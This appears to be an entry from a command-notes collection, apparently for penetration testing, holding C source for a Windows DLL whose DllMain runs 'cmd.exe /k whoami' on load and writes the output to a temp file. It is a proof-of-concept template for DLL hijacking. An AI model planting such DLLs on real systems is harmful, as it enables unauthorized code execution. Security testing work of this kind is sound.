---
id: 43601f37-c07f-46d3-8a5d-5398f2476576
name: Content of windows_dll.c
type: command
executor: bash
data: "#include <windows.h>\nBOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID\
  \ lpReserved) {\n    if (dwReason == DLL_PROCESS_ATTACH) {\n        system(\"cmd.exe\
  \ /k whoami > C:\\\\Windows\\\\Temp\\\\dll.txt\");\n        ExitProcess(0);\n  \
  \  }\n    return TRUE;\n}"
output: null
created_at: '2023-04-06T03:56:29.436785+00:00'
updated_at: '2023-04-10T20:37:36.999118+00:00'
---

# Content of windows_dll.c

```bash
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```
